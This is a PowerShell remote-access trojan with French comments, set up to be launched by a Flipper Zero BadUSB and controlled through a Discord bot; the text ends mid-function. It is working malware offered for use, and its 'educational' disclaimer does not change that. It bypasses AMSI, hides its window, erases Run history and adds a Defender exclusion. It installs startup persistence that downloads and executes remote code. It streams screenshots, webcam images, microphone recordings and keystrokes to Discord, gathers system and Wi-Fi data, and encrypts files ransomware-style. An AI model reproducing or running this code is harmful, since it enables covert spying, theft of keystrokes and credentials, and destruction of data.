<#
AVERTISSEMENT : Ce script est destiné à des fins éducatives et de sensibilisation en cybersécurité.
Il doit être exécuté UNIQUEMENT sur une machine que vous possédez et avec votre consentement explicite.
Toute utilisation non autorisée est strictement interdite et illégale.

**SETUP**
1. Créez un bot Discord sur https://discord.com/developers/applications/
2. Activez tous les Privileged Gateway Intents dans l'onglet 'Bot'
3. Dans OAuth2, cochez 'Bot' dans Scopes
4. Dans Bot Permissions, cochez Manage Channels, Read Messages/View Channels, Attach Files, Read Message History
5. Copiez l'URL générée et ajoutez le bot à votre serveur
6. Réinitialisez et copiez le token du bot
7. Configurez le Flipper Zero pour exécuter la commande BadUSB fournie
8. Assurez-vous que l'URL https://is.gd/y92xe4 pointe vers ce script
#>

# ------------------------- CONFIGURATION GLOBALE -------------------------

$global:token = "$tk" # Inséré via Flipper Zero
$global:SessionID = "$ch" # Inséré via Flipper Zero
$HideConsole = 1 # 1 = masquer la console, 0 = afficher
$spawnChannels = 1 # 1 = créer des canaux au démarrage
$InfoOnConnect = 1 # 1 = envoyer les infos système au démarrage
$defaultstart = 1 # 1 = démarrer tous les jobs automatiquement
$parent = "https://is.gd/y92xe4" # URL du script parent
$DebugMode = 0 # 1 = activer le mode débogage
$version = "1.7.2" # Version du script (mise à jour pour persistance)
$ScreenshotInterval = 10 # Intervalle entre captures d'écran (secondes)
$WebcamInterval = 15 # Intervalle entre captures webcam (secondes)
$MicrophoneInterval = 60 # Durée des enregistrements audio (secondes)
$EncryptionKey = "0123456789ABCDEF0123456789ABCDEF" # Clé AES fixe (32 octets)
$CategoryFile = "$env:Temp\c2_category.txt" # Fichier pour stocker l'ID de la catégorie

# Nettoyage initial
if (Test-Path "C:\Windows\Tasks\service.vbs") {
    $InfoOnConnect = 0
    Remove-Item -Path "C:\Windows\Tasks\service.vbs" -Force -ErrorAction SilentlyContinue
}

# ------------------------- BYPASS AMSI -------------------------

try {
    $mem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((([System.Reflection.Assembly]::GetExecutingAssembly().GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true))), [Action])
    Write-DebugLog "Bypass AMSI appliqué avec succès"
} catch {
    Write-DebugLog "Erreur lors du bypass AMSI : $_"
}

# ------------------------- FONCTIONS UTILITAIRES -------------------------

# Journalisation pour le débogage
function Write-DebugLog {
    param([string]$Message)
    if ($DebugMode -eq 1) {
        $logPath = "$env:Temp\c2_debug.log"
        $timestamp = Get-Date -Format "dd/MM/yyyy HH:mm:ss"
        "$timestamp - $Message" | Out-File -FilePath $logPath -Append -Encoding UTF8
    }
}

# Masquer les fenêtres
function Hide-Window {
    try {
        if ($HideConsole -eq 1) {
            $windowCode = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
            Add-Type -Name Win32 -MemberDefinition $windowCode -Namespace Win32Functions
            $hwnd = (Get-Process -Id $PID).MainWindowHandle
            if ($hwnd -ne 0) {
                [Win32Functions.Win32]::ShowWindow($hwnd, 0)
            }
        }
        Write-DebugLog "Fenêtres masquées avec succès"
    } catch {
        Write-DebugLog "Erreur lors du masquage des fenêtres : $_"
        Send-Error -ErrorMessage "Échec du masquage des fenêtres : $_" -Context "Hide-Window"
    }
}

# Suppression de l'historique de la fenêtre Exécuter
function Clear-RunHistory {
    try {
        $runMRUPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
        $runMRU = Get-Item -Path $runMRUPath -ErrorAction SilentlyContinue
        if ($runMRU) {
            $runMRU.Property | ForEach-Object {
                if ($_ -ne "MRUList") {
                    $command = (Get-ItemProperty -Path $runMRUPath -Name $_).$_ 
                    if ($command -like "*powershell*") {
                        Remove-ItemProperty -Path $runMRUPath -Name $_ -Force -ErrorAction SilentlyContinue
                        Write-DebugLog "Commande supprimée de l'historique RunMRU : $command"
                    }
                }
            }
            $mruList = (Get-ItemProperty -Path $runMRUPath -Name MRUList -ErrorAction SilentlyContinue).MRUList
            if ($mruList) {
                $newMruList = ($mruList.ToCharArray() | Where-Object { (Get-ItemProperty -Path $runMRUPath -Name $_ -ErrorAction SilentlyContinue) }) -join ''
                Set-ItemProperty -Path $runMRUPath -Name MRUList -Value $newMruList -Force -ErrorAction SilentlyContinue
            }
            Write-DebugLog "Historique de la fenêtre Exécuter nettoyé"
            Send-Message -Embed @{
                "title" = "Historique Exécuter nettoyé"
                "description" = "Les commandes PowerShell ont été supprimées de l'historique de la fenêtre Exécuter."
                "color" = 0x00FF00
                "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
            }
        }
    } catch {
        Write-DebugLog "Erreur lors du nettoyage de l'historique RunMRU : $_"
        Send-Error -ErrorMessage "Échec du nettoyage de l'historique Exécuter : $_" -Context "Clear-RunHistory"
    }
}

# Ajouter une exclusion Defender
function Add-DefenderExclusion {
    try {
        Add-MpPreference -ExclusionPath $env:Temp -ErrorAction SilentlyContinue
        Write-DebugLog "Exclusion Defender ajoutée pour $env:Temp"
    } catch {
        Write-DebugLog "Erreur lors de l'ajout de l'exclusion Defender : $_"
        Send-Error -ErrorMessage "Échec de l'ajout de l'exclusion Defender : $_" -Context "Add-DefenderExclusion"
    }
}

# Supprimer l'exclusion Defender
function Remove-DefenderExclusion {
    try {
        Remove-MpPreference -ExclusionPath $env:Temp -ErrorAction SilentlyContinue
        Write-DebugLog "Exclusion Defender supprimée pour $env:Temp"
    } catch {
        Write-DebugLog "Erreur lors de la suppression de l'exclusion Defender : $_"
        Send-Error -ErrorMessage "Échec de la suppression de l'exclusion Defender : $_" -Context "Remove-DefenderExclusion"
    }
}

# Envoi d'erreurs à Discord
function Send-Error {
    param([string]$ErrorMessage, [string]$Context, [string]$ChannelID = $global:SessionID)
    try {
        if ([string]::IsNullOrWhiteSpace($ChannelID)) {
            throw "L'ID du canal est vide"
        }
        $url = "https://discord.com/api/v10/channels/$ChannelID/messages"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $token")
        $wc.Headers.Add("Content-Type", "application/json")
        $embed = @{
            "title" = "Erreur détectée"
            "description" = "$ErrorMessage"
            "color" = 0xFF0000
            "fields" = @(
                @{ "name" = "Contexte"; "value" = "$Context"; "inline" = $true }
                @{ "name" = "Horodatage"; "value" = (Get-Date -Format "dd/MM/yyyy HH:mm:ss"); "inline" = $true }
            )
            "footer" = @{ "text" = "Discord C2 v$version" }
        }
        $jsonBody = @{ "embeds" = @($embed) } | ConvertTo-Json -Depth 10 -Compress
        $wc.UploadString($url, "POST", $jsonBody) | Out-Null
        Write-DebugLog "Erreur envoyée à Discord : $ErrorMessage (Contexte : $Context)"
    } catch {
        Write-DebugLog "Erreur lors de l'envoi de l'erreur à Discord : $_"
    }
}

# ------------------------- PERSISTANCE -------------------------

# Ajouter la persistance via tâche planifiée
function Add-Persistence {
    try {
        $taskName = "DiscordC2Task"
        $scriptPath = "$env:Temp\DiscordC2.ps1"
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -Command `"& { `$mem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((([System.Reflection.Assembly]::GetExecutingAssembly().GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue(`$null, `$true))), [Action]); irm $parent | iex }`""
        $trigger = New-ScheduledTaskTrigger -AtStartup
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Description "Tâche de persistance pour Discord C2" -Force -ErrorAction SilentlyContinue
        Write-DebugLog "Tâche planifiée $taskName créée pour la persistance"
        Send-Message -Embed @{
            "title" = "Persistance ajoutée"
            "description" = "Le script sera relancé automatiquement au démarrage du système."
            "color" = 0x00FF00
            "fields" = @(
                @{ "name" = "Tâche"; "value" = "$taskName"; "inline" = $true }
                @{ "name" = "URL"; "value" = "$parent"; "inline" = $true }
            )
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
    } catch {
        Write-DebugLog "Erreur lors de l'ajout de la persistance : $_"
        Send-Error -ErrorMessage "Échec de l'ajout de la persistance : $_" -Context "Add-Persistence"
    }
}

# Supprimer la persistance
function Remove-Persistence {
    try {
        $taskName = "DiscordC2Task"
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
        Write-DebugLog "Tâche planifiée $taskName supprimée"
        Send-Message -Embed @{
            "title" = "Persistance supprimée"
            "description" = "La tâche planifiée a été supprimée."
            "color" = 0x00FF00
            "fields" = @(
                @{ "name" = "Tâche"; "value" = "$taskName"; "inline" = $true }
            )
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
    } catch {
        Write-DebugLog "Erreur lors de la suppression de la persistance : $_"
        Send-Error -ErrorMessage "Échec de la suppression de la persistance : $_" -Context "Remove-Persistence"
    }
}

# ------------------------- GESTION DISCORD -------------------------

# Téléchargement de ffmpeg
function Get-Ffmpeg {
    try {
        Write-DebugLog "Démarrage du téléchargement de FFmpeg"
        Send-Message -Embed @{
            "title" = "Téléchargement de FFmpeg"
            "description" = "Téléchargement en cours... Veuillez patienter."
            "color" = 0x00FFFF
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
        $Path = "$env:Temp\ffmpeg.exe"
        if (!(Test-Path $Path)) {
            $apiUrl = "https://api.github.com/repos/GyanD/codexffmpeg/releases/latest"
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add("User-Agent", "PowerShell")
            $response = $wc.DownloadString($apiUrl)
            $release = $response | ConvertFrom-Json
            $asset = $release.assets | Where-Object { $_.name -like "*essentials_build.zip" }
            $zipUrl = $asset.browser_download_url
            $zipFilePath = Join-Path $env:Temp $asset.name
            $extractedDir = Join-Path $env:Temp ($asset.name -replace '.zip$', '')
            $wc.DownloadFile($zipUrl, $zipFilePath)
            Expand-Archive -Path $zipFilePath -DestinationPath $env:Temp -Force
            Move-Item -Path (Join-Path $extractedDir 'bin\ffmpeg.exe') -Destination $Path -Force
            Remove-Item -Path $zipFilePath -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $extractedDir -Recurse -Force -ErrorAction SilentlyContinue
        }
        Write-DebugLog "FFmpeg téléchargé avec succès"
        Send-Message -Embed @{
            "title" = "FFmpeg téléchargé"
            "description" = "FFmpeg est prêt à être utilisé."
            "color" = 0x00FF00
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
    } catch {
        Write-DebugLog "Erreur lors du téléchargement de FFmpeg : $_"
        Send-Error -ErrorMessage "Échec du téléchargement de FFmpeg : $_" -Context "Get-Fffmpeg"
    }
}

# Création ou réutilisation d'une catégorie de canaux
function New-ChannelCategory {
    try {
        # Vérifier si une catégorie existe déjà
        if (Test-Path $CategoryFile) {
            $global:CategoryID = Get-Content -Path $CategoryFile -Raw
            Write-DebugLog "Catégorie existante chargée : $global:CategoryID"
            Send-Message -Embed @{
                "title" = "Catégorie existante utilisée"
                "description" = "La catégorie existante sera utilisée pour les messages."
                "color" = 0x00FF00
                "fields" = @(
                    @{ "name" = "ID"; "value" = "$global:CategoryID"; "inline" = $true }
                )
                "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
            }
            return
        }

        # Créer une nouvelle catégorie si aucune n'existe
        $headers = @{ 'Authorization' = "Bot $token" }
        $guildID = $null
        while (!$guildID) {
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add("Authorization", $headers.Authorization)
            $response = $wc.DownloadString("https://discord.com/api/v10/users/@me/guilds")
            $guilds = $response | ConvertFrom-Json
            $guildID = $guilds[0].id
            Start-Sleep -Seconds 3
        }
        $uri = "https://discord.com/api/guilds/$guildID/channels"
        $randomID = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_})
        $body = @{
            "name" = "sys-$randomID"
            "type" = 4
        } | ConvertTo-Json
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $token")
        $wc.Headers.Add("Content-Type", "application/json")
        $response = $wc.UploadString($uri, "POST", $body)
        $responseObj = ConvertFrom-Json $response
        $global:CategoryID = $responseObj.id
        $global:CategoryID | Out-File -FilePath $CategoryFile -Encoding UTF8
        Write-DebugLog "Catégorie créée : $global:CategoryID"
        Send-Message -Embed @{
            "title" = "Catégorie créée"
            "description" = "Nouvelle catégorie créée pour les opérations C2."
            "color" = 0x00FF00
            "fields" = @(
                @{ "name" = "Nom"; "value" = "sys-$randomID"; "inline" = $true }
                @{ "name" = "ID"; "value" = "$global:CategoryID"; "inline" = $true }
            )
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
    } catch {
        Write-DebugLog "Erreur lors de la création ou réutilisation de la catégorie : $_"
        Send-Error -ErrorMessage "Échec de la création/réutilisation de la catégorie : $_" -Context "New-ChannelCategory"
    }
}

# Création d'un canal
function New-Channel {
    param([string]$name)
    try {
        if ([string]::IsNullOrWhiteSpace($name)) {
            throw "Le nom du canal ne peut pas être vide"
        }
        $headers = @{ 'Authorization' = "Bot $token" }
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", $headers.Authorization)
        $response = $wc.DownloadString("https://discord.com/api/v10/users/@me/guilds")
        $guilds = $response | ConvertFrom-Json
        $guildID = $guilds[0].id
        $uri = "https://discord.com/api/guilds/$guildID/channels"
        $randomID = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_})
        $body = @{
            "name" = "$name-$randomID"
            "type" = 0
            "parent_id" = $global:CategoryID
        } | ConvertTo-Json
        $wc.Headers.Add("Content-Type", "application/json")
        $response = $wc.UploadString($uri, "POST", $body)
        $responseObj = ConvertFrom-Json $response
        $global:ChannelID = $responseObj.id
        Write-DebugLog "Canal créé : $name-$randomID ($global:ChannelID)"
        Send-Message -Embed @{
            "title" = "Canal créé"
            "description" = "Nouveau canal créé pour $name."
            "color" = 0x00FF00
            "fields" = @(
                @{ "name" = "Nom"; "value" = "$name-$randomID"; "inline" = $true }
                @{ "name" = "ID"; "value" = "$global:ChannelID"; "inline" = $true }
            )
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
    } catch {
        Write-DebugLog "Erreur lors de la création du canal $name : $_"
        Send-Error -ErrorMessage "Échec de la création du canal $name : $_" -Context "New-Channel"
    }
}

# Envoi de messages ou embeds à Discord
function Send-Message {
    param([string]$Message, [hashtable]$Embed, [string]$ChannelID = $global:SessionID)
    try {
        if ([string]::IsNullOrWhiteSpace($ChannelID)) {
            throw "L'ID du canal est vide"
        }
        $url = "https://discord.com/api/v10/channels/$ChannelID/messages"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $token")
        $wc.Headers.Add("Content-Type", "application/json")
        if ($Embed) {
            $jsonBody = @{ "embeds" = @($Embed) } | ConvertTo-Json -Depth 10 -Compress
            $wc.UploadString($url, "POST", $jsonBody) | Out-Null
        }
        if ($Message) {
            $jsonBody = @{
                "content" = "$Message"
                "username" = "$env:COMPUTERNAME"
            } | ConvertTo-Json
            $wc.UploadString($url, "POST", $jsonBody) | Out-Null
        }
        Write-DebugLog "Message envoyé au canal $ChannelID : $Message"
    } catch {
        Write-DebugLog "Erreur lors de l'envoi du message : $_"
        Send-Error -ErrorMessage "Échec de l'envoi du message : $_" -Context "Send-Message"
    }
}

# Envoi de fichiers à Discord
function Send-File {
    param([string]$FilePath, [string]$ChannelID = $global:SessionID)
    try {
        if (-not (Test-Path $FilePath -PathType Leaf)) {
            throw "Fichier introuvable : $FilePath"
        }
        $url = "https://discord.com/api/v10/channels/$ChannelID/messages"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $token")
        $wc.UploadFile($url, "POST", $FilePath) | Out-Null
        Write-DebugLog "Fichier envoyé : $FilePath"
        Remove-Item -Path $FilePath -Force -ErrorAction SilentlyContinue
        Send-Message -Embed @{
            "title" = "Fichier envoyé"
            "description" = "Le fichier a été envoyé avec succès."
            "color" = 0x00FF00
            "fields" = @(
                @{ "name" = "Fichier"; "value" = (Split-Path $FilePath -Leaf); "inline" = $true }
                @{ "name" = "Canal"; "value" = "$ChannelID"; "inline" = $true }
            )
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
    } catch {
        Write-DebugLog "Erreur lors de l'envoi du fichier $FilePath : $_"
        Send-Error -ErrorMessage "Échec de l'envoi du fichier : $_" -Context "Send-File"
    }
}

# ------------------------- SURVEILLANCE -------------------------

# Capture d'écran
function Start-ScreenJob {
    try {
        Get-Fffmpeg
        $global:ScreenJobID = $global:ChannelID
        Start-Job -Name ScreenJob -ScriptBlock {
            param($ScreenshotInterval, $ScreenJobID, $token)
            while ($true) {
                $Path = "$env:Temp\Screen.jpg"
                & "$env:Temp\ffmpeg.exe" -f gdigrab -i desktop -vframes 1 -q:v 15 $Path -y -loglevel quiet
                $url = "https://discord.com/api/v10/channels/$ScreenJobID/messages"
                $wc = New-Object System.Net.WebClient
                $wc.Headers.Add("Authorization", "Bot $token")
                if (Test-Path $Path) {
                    $wc.UploadFile($url, "POST", $Path) | Out-Null
                    Remove-Item -Path $Path -Force -ErrorAction SilentlyContinue
                }
                Start-Sleep -Seconds $ScreenshotInterval
            }
        } -ArgumentList $ScreenshotInterval, $global:ScreenJobID, $token
        Write-DebugLog "Job de capture d'écran démarré"
        Send-Message -Embed @{
            "title" = "Capture d'écran démarrée"
            "description" = "Le job de capture d'écran a été lancé."
            "color" = 0x00FF00
            "fields" = @(
                @{ "name" = "Intervalle"; "value" = "$ScreenshotInterval secondes"; "inline" = $true }
                @{ "name" = "Canal"; "value" = "$global:ScreenJobID"; "inline" = $true }
            )
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
    } catch {
        Write-DebugLog "Erreur lors du démarrage de ScreenJob : $_"
        Send-Error -ErrorMessage "Échec du démarrage de ScreenJob : $_" -Context "Start-ScreenJob"
    }
}

# Capture webcam
function Start-CamJob {
    try {
        Get-Fffmpeg
        $global:CamJobID = $global:ChannelID
        Start-Job -Name CamJob -ScriptBlock {
            param($WebcamInterval, $CamJobID, $token)
            while ($true) {
                $Path = "$env:Temp\Cam.jpg"
                & "$env:Temp\ffmpeg.exe" -f dshow -i video="Integrated Webcam" -vframes 1 -q:v 15 $Path -y -loglevel quiet
                $url = "https://discord.com/api/v10/channels/$CamJobID/messages"
                $wc = New-Object System.Net.WebClient
                $wc.Headers.Add("Authorization", "Bot $token")
                if (Test-Path $Path) {
                    $wc.UploadFile($url, "POST", $Path) | Out-Null
                    Remove-Item -Path $Path -Force -ErrorAction SilentlyContinue
                }
                Start-Sleep -Seconds $WebcamInterval
            }
        } -ArgumentList $WebcamInterval, $global:CamJobID, $token
        Write-DebugLog "Job de capture webcam démarré"
        Send-Message -Embed @{
            "title" = "Capture webcam démarrée"
            "description" = "Le job de capture webcam a été lancé."
            "color" = 0x00FF00
            "fields" = @(
                @{ "name" = "Intervalle"; "value" = "$WebcamInterval secondes"; "inline" = $true }
                @{ "name" = "Canal"; "value" = "$global:CamJobID"; "inline" = $true }
            )
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
    } catch {
        Write-DebugLog "Erreur lors du démarrage de CamJob : $_"
        Send-Error -ErrorMessage "Échec du démarrage de CamJob : $_" -Context "Start-CamJob"
    }
}

# Capture audio
function Start-AudioJob {
    try {
        Get-Fffmpeg
        $global:MicJobID = $global:ChannelID
        Start-Job -Name MicJob -ScriptBlock {
            param($MicrophoneInterval, $MicJobID, $token)
            while ($true) {
                $Path = "$env:Temp\mic.wav"
                & "$env:Temp\ffmpeg.exe" -f dshow -i audio="Microphone (Realtek Audio)" -t $MicrophoneInterval -b:a 64k $Path -y -loglevel quiet
                $url = "https://discord.com/api/v10/channels/$MicJobID/messages"
                $wc = New-Object System.Net.WebClient
                $wc.Headers.Add("Authorization", "Bot $token")
                if (Test-Path $Path) {
                    $wc.UploadFile($url, "POST", $Path) | Out-Null
                    Remove-Item -Path $Path -Force -ErrorAction SilentlyContinue
                }
                Start-Sleep -Seconds $MicrophoneInterval
            }
        } -ArgumentList $MicrophoneInterval, $global:MicJobID, $token
        Write-DebugLog "Job de capture audio démarré"
        Send-Message -Embed @{
            "title" = "Capture audio démarrée"
            "description" = "Le job de capture audio a été lancé."
            "color" = 0x00FF00
            "fields" = @(
                @{ "name" = "Intervalle"; "value" = "$MicrophoneInterval secondes"; "inline" = $true }
                @{ "name" = "Canal"; "value" = "$global:MicJobID"; "inline" = $true }
            )
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
    } catch {
        Write-DebugLog "Erreur lors du démarrage de MicJob : $_"
        Send-Error -ErrorMessage "Échec du démarrage de MicJob : $_" -Context "Start-AudioJob"
    }
}

# Keylogger
function Start-KeyJob {
    try {
        $global:KeyJobID = $global:ChannelID
        Start-Job -Name KeyJob -ScriptBlock {
            param($KeyJobID, $token)
            Add-Type @"
                using System;
                using System.Runtime.InteropServices;
                public class Keyboard {
                    [DllImport("user32.dll")]
                    public static extern int GetAsyncKeyState(int i);
                }
"@
            $keys = ""
            while ($true) {
                Start-Sleep -Milliseconds 10
                for ($i = 1; $i -le 255; $i++) {
                    $state = [Keyboard]::GetAsyncKeyState($i)
                    if ($state -eq -32767) {
                        $keys += [char]$i
                    }
                }
                if ($keys.Length -gt 100) {
                    $url = "https://discord.com/api/v10/channels/$KeyJobID/messages"
                    $wc = New-Object System.Net.WebClient
                    $wc.Headers.Add("Authorization", "Bot $token")
                    $wc.Headers.Add("Content-Type", "application/json")
                    $jsonBody = @{ "content" = "``````$keys``````" } | ConvertTo-Json
                    $wc.UploadString($url, "POST", $jsonBody) | Out-Null
                    $keys = ""
                }
            }
        } -ArgumentList $global:KeyJobID, $token
        Write-DebugLog "Job de keylogging démarré"
        Send-Message -Embed @{
            "title" = "Keylogger démarré"
            "description" = "Le job de keylogging a été lancé."
            "color" = 0x00FF00
            "fields" = @(
                @{ "name" = "Canal"; "value" = "$global:KeyJobID"; "inline" = $true }
            )
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
    } catch {
        Write-DebugLog "Erreur lors du démarrage de KeyJob : $_"
        Send-Error -ErrorMessage "Échec du démarrage de KeyJob : $_" -Context "Start-KeyJob"
    }
}

# ------------------------- COLLECTE D'INFORMATIONS -------------------------

# Informations système
function Get-SystemInfo {
    try {
        $computerSystem = Get-WmiObject Win32_ComputerSystem
        $os = Get-WmiObject Win32_OperatingSystem
        $cpu = Get-WmiObject Win32_Processor
        $disk = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DeviceID -eq "C:" }
        $info = @{
            "OS" = "$($os.Caption) $($os.Version)"
            "Computer" = "$($computerSystem.Name)"
            "CPU" = "$($cpu.Name)"
            "RAM" = "{0:N2} GB" -f ($computerSystem.TotalPhysicalMemory / 1GB)
            "Disk Free" = "{0:N2} GB" -f ($disk.FreeSpace / 1GB)
        }
        Send-Message -Embed @{
            "title" = "Informations système"
            "description" = "Détails sur le système cible."
            "color" = 0x00FFFF
            "fields" = @(
                @{ "name" = "Système d'exploitation"; "value" = $info.OS; "inline" = $true }
                @{ "name" = "Nom de l'ordinateur"; "value" = $info.Computer; "inline" = $true }
                @{ "name" = "CPU"; "value" = $info.CPU; "inline" = $true }
                @{ "name" = "RAM"; "value" = $info.RAM; "inline" = $true }
                @{ "name" = "Espace disque libre"; "value" = $info."Disk Free"; "inline" = $true }
            )
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
        Write-DebugLog "Informations système collectées"
    } catch {
        Write-DebugLog "Erreur lors de la collecte des informations système : $_"
        Send-Error -ErrorMessage "Échec de la collecte des informations système : $_" -Context "Get-SystemInfo"
    }
}

# Liste des processus
function Get-RunningProcesses {
    try {
        $processes = Get-Process | Select-Object Name, ID, CPU | Sort-Object CPU -Descending | Select-Object -First 10
        $fields = $processes | ForEach-Object {
            @{ "name" = "$($_.Name) (PID: $($_.ID))"; "value" = "CPU: $($_.CPU)"; "inline" = $true }
        }
        Send-Message -Embed @{
            "title" = "Processus en cours"
            "description" = "Liste des 10 processus les plus consommateurs."
            "color" = 0x00FFFF
            "fields" = $fields
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
        Write-DebugLog "Liste des processus envoyée"
    } catch {
        Write-DebugLog "Erreur lors de la collecte des processus : $_"
        Send-Error -ErrorMessage "Échec de la collecte des processus : $_" -Context "Get-RunningProcesses"
    }
}

# Informations réseau
function Get-NetworkInfo {
    try {
        $network = Get-NetAdapter | Where-Object { $_.Status -eq "Up" }
        $fields = $network | ForEach-Object {
            @{ "name" = "$($_.Name)"; "value" = "MAC: $($_.MacAddress)\nVitesse: $($_.LinkSpeed)"; "inline" = $true }
        }
        Send-Message -Embed @{
            "title" = "Informations réseau"
            "description" = "Détails des adaptateurs réseau actifs."
            "color" = 0x00FFFF
            "fields" = $fields
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
        Write-DebugLog "Informations réseau collectées"
    } catch {
        Write-DebugLog "Erreur lors de la collecte des informations réseau : $_"
        Send-Error -ErrorMessage "Échec de la collecte des informations réseau : $_" -Context "Get-NetworkInfo"
    }
}

# Liste des réseaux Wi-Fi à proximité
function Get-NearbyWifi {
    try {
        $networks = netsh wlan show networks mode=bssid | Select-String "SSID", "Signal" | Out-String
        Send-Message -Embed @{
            "title" = "Réseaux Wi-Fi à proximité"
            "description" = "```$networks```"
            "color" = 0x00FFFF
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
        Write-DebugLog "Réseaux Wi-Fi collectés"
    } catch {
        Write-DebugLog "Erreur lors de la collecte des réseaux Wi-Fi : $_"
        Send-Error -ErrorMessage "Échec de la collecte des réseaux Wi-Fi : $_" -Context "Get-NearbyWifi"
    }
}

# ------------------------- NUISIBLES -------------------------

# Chiffrement des fichiers
function Encrypt-Files {
    param([string]$Path)
    try {
        if (-not (Test-Path $Path -PathType Container)) {
            throw "Dossier introuvable : $Path"
        }
        Add-Type -AssemblyName System.Security
        $key = [Convert]::FromBase64String([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($EncryptionKey)))
        $files = Get-ChildItem -Path $Path -File
        foreach ($file in $files) {
            $content = [System.IO.File]::ReadAllBytes($file.FullName)
            $aes = New-Object System.Security.Cryptography.AesManaged
            $aes.Key = $key
            $aes.IV = $key[0..15]
            $encryptor = $aes.CreateEncryptor()
            $encrypted = $encryptor.TransformFinalBlock($content, 0, $content.Length)
            [System.IO.File]::WriteAllBytes("$($file.FullName).enc", $encrypted)
            Remove-Item -Path $file.FullName -Force -ErrorAction SilentlyContinue
        }
        $keyPath = "$env:Temp\c2_key.txt"
        $EncryptionKey | Out-File -FilePath $keyPath -Encoding UTF8
        Send-Message -Embed @{
            "title" = "Fichiers chiffrés"
            "description" = "Les fichiers dans le dossier spécifié ont été chiffrés."
            "color" = 0x00FF00
            "fields" = @(
                @{ "name" = "Dossier"; "value" = "$Path"; "inline" = $true }
                @{ "name" = "Clé de chiffrement"; "value" = "$EncryptionKey"; "inline" = $true }
                @{ "name" = "Fichier de clé"; "value" = "$keyPath"; "inline" = $true }
            )
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
        Write-DebugLog "Fichiers chiffrés dans $Path"
    } catch {
        Write-DebugLog "Erreur lors du chiffrement des fichiers : $_"
        Send-Error -ErrorMessage "Échec du chiffrement des fichiers : $_" -Context "Encrypt-Files"
    }
}

# Déchiffrement des fichiers
function Decrypt-Files {
    param([string]$Path)
    try {
        if (-not (Test-Path $Path -PathType Container)) {
            throw "Dossier introuvable : $Path"
        }
        Add-Type -AssemblyName System.Security
        $key = [Convert]::FromBase64String([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($EncryptionKey)))
        $files = Get-ChildItem -Path $Path -File | Where-Object { $_.Extension -eq ".enc" }
        foreach ($file in $files) {
            $content = [System.IO.File]::ReadAllBytes($file.FullName)
            $aes = New-Object System.Security.Cryptography.AesManaged
            $aes.Key = $key
            $aes.IV = $key[0..15]
            $decryptor = $aes.CreateDecryptor()
            $decrypted = $decryptor.TransformFinalBlock($content, 0, $content.Length)
            $originalPath = $file.FullName -replace ".enc$"
            [System.IO.File]::WriteAllBytes($originalPath, $decrypted)
            Remove-Item -Path $file.FullName -Force -ErrorAction SilentlyContinue
        }
        Send-Message -Embed @{
            "title" = "Fichiers déchiffrés"
            "description" = "Les fichiers dans le dossier spécifié ont été déchiffrés."
            "color" = 0x00FF00
            "fields" = @(
                @{ "name" = "Dossier"; "value" = "$Path"; "inline" = $true }
                @{ "name" = "Clé utilisée"; "value" = "$EncryptionKey"; "inline" = $true }
            )
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
